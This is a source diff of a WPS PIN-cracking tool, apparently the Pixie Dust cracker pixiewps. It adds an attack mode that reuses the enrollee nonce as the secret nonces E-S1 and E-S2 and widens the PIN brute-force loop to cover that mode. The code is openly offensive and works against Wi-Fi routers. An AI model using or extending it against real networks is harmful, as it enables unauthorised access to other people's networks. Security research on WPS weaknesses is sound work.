@@ -5,7 +5,7 @@
  * Special thanks to: datahead, soxrok2212
  *
  * Copyright (c) 2015, wiire <wi7ire@gmail.com>
- * Version: 1.0
+ * Version: 1.0.5
  *
  * DISCLAIMER: This tool was made for educational purposes only.
  *             The author is NOT responsible for any misuse or abuse.
@@ -214,13 +214,18 @@ int main(int argc, char **argv) {
 
 	gettimeofday(&t0, 0);
 
-	while (mode < 3 && !found) {
+	while (mode < 4 && !found) {
 
 		first_half = 0;
 		second_half = 0;
 
-		/* PRNG bruteforce */
 		if (mode == 2 && e_nonce) {
+			memcpy(e_s1, e_nonce, NONCE_LEN);
+			memcpy(e_s2, e_nonce, NONCE_LEN);
+		}
+
+		/* PRNG bruteforce */
+		if (mode == 3 && e_nonce) {
 
 			/* Reducing entropy from 32 to 25 bits */
 			unsigned int index = e_nonce[0] << 25;
@@ -255,7 +260,7 @@ int main(int argc, char **argv) {
 		}
 
 		/* WPS pin cracking */
-		if (mode == 1 || (mode == 2 && print_seed)) {
+		if (mode == 1 || (mode == 2 && e_nonce) || (mode == 3 && print_seed)) {
 			while (first_half < 10000) {
 				uint_to_char_array(first_half, 4, s_pin);
 				hmac_sha256(authkey, AUTHKEY_LEN, (unsigned char *) s_pin, 4, psk1);
@@ -336,7 +341,7 @@ int main(int argc, char **argv) {
 	mode--;
 
 	if (found) {
-		if (e_nonce && mode == 2) {
+		if (e_nonce && mode == 3) {
 			printf("\n [*] PRNG Seed: %u", print_seed);
 		}
 		printf("\n [*] ES-1: ");
